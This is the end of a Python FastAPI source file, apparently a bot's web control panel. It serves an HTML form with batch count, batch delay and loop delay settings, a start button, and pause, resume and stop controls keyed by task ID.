            <div id="batchCountCollapse" class="accordion-collapse collapse" aria-labelledby="batchCountHeading" data-bs-parent="#formAccordion">
              <div class="accordion-body">
                <select name="batchCountOption" class="form-select mb-2" onchange="toggleInput(this, 'batchCount')">
                  <option value="">None</option>
                  <option value="manual">Manual</option>
                  <option value="file">File</option>
                </select>
                <input type="text" name="batchCount" class="form-control mb-2 batchCount manual-input d-none" placeholder="Enter Batch Count (Manual)">
                <input type="file" name="batchCountFile" class="form-control batchCount file-input d-none">
              </div>
            </div>
          </div>

          <!-- BATCH DELAY -->
          <div class="accordion-item">
            <h2 class="accordion-header" id="batchDelayHeading">
              <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#batchDelayCollapse" aria-expanded="false" aria-controls="batchDelayCollapse">
                BATCH DELAY
              </button>
            </h2>
            <div id="batchDelayCollapse" class="accordion-collapse collapse" aria-labelledby="batchDelayHeading" data-bs-parent="#formAccordion">
              <div class="accordion-body">
                <select name="batchDelayOption" class="form-select mb-2" onchange="toggleInput(this, 'batchDelay')">
                  <option value="">None</option>
                  <option value="manual">Manual</option>
                  <option value="file">File</option>
                </select>
                <input type="text" name="batchDelay" class="form-control mb-2 batchDelay manual-input d-none" placeholder="Enter Batch Delay (Manual)">
                <input type="file" name="batchDelayFile" class="form-control batchDelay file-input d-none">
              </div>
            </div>
          </div>

          <!-- LOOP DELAY -->
          <div class="accordion-item">
            <h2 class="accordion-header" id="headingLoopDelay">
              <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapseLoopDelay">
                LOOP DELAY
              </button>
            </h2>
            <div id="collapseLoopDelay" class="accordion-collapse collapse" data-bs-parent="#formAccordion">
              <div class="accordion-body">
                <select class='form-control' name='loopDelayOption' onchange="toggleInputs('loopDelay', this.value)">
                  <option value=''>None</option>
                  <option value='manual'>Manual</option>
                  <option value='file'>File</option>
                </select>
                <input type='text' class='form-control' name='loopDelay' id='loopDelayManual' placeholder='Enter loop delay' style='display:none'>
                <input type='file' class='form-control' name='loopDelayFile' id='loopDelayFile' style='display:none'>
              </div>
            </div>
          </div>

        </div>

        <div class="task-box">
          <button type="submit" class='btn btn-success w-100 mt-3'>START TASK</button>
        </div>
      </form>

      <!-- SINGLE TASK CONTROL SECTION -->
<div class="task-box">
  <form id="taskControlForm" method="POST">
    <label>CONTROL TASK BY ID</label>
    <input class="form-control mb-3" name="taskId" id="taskId" placeholder="Enter Task ID" required>

    <div class="row g-2">
      <div class="col">
        <button type="button" class="btn btn-pause w-100" onclick="sendTaskAction('pause')">PAUSE</button>
      </div>
      <div class="col">
        <button type="button" class="btn btn-resume w-100" onclick="sendTaskAction('resume')">RESUME</button>
      </div>
      <div class="col">
        <button type="button" class="btn btn-stop w-100" onclick="sendTaskAction('stop')">STOP</button>
      </div>
    </div>
  </form>
</div>

      <!-- FOOTER -->
      <div class="task-box text-center">
        <div style="color:#00ffff; text-shadow:0 0 6px #00ffff; font-size: 20px; animation: glowText 2.5s infinite alternate;">
          🚀 <b>@ 2025 DEVELOPED BY AKKI</b> 🚀
        </div>
      </div>
    </div>
  </div>

  <script>
    function toggleInput(select, prefix) {
      const manualInput = document.querySelector(`.${prefix}.manual-input`);
      const fileInput = document.querySelector(`.${prefix}.file-input`);

      manualInput.classList.add("d-none");
      fileInput.classList.add("d-none");

      if (select.value === "manual") {
        manualInput.classList.remove("d-none");
      } else if (select.value === "file") {
        fileInput.classList.remove("d-none");
      }
    }

    function toggleInputs(field, val) {
      document.getElementById(field + 'Manual').style.display = (val == 'manual') ? 'block' : 'none';
      document.getElementById(field + 'File').style.display = (val == 'file') ? 'block' : 'none';
    }

  </script>

  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
"""
@app.get("/", response_class=HTMLResponse)
async def index_get():
    return HTML

# ---------------- Main ----------------
if __name__ == "__main__":
    # Use reload=True for debug-like behavior
    uvicorn.run("bot:app", host="0.0.0.0", port=int(os.environ.get("PORT", 21298)), reload=True)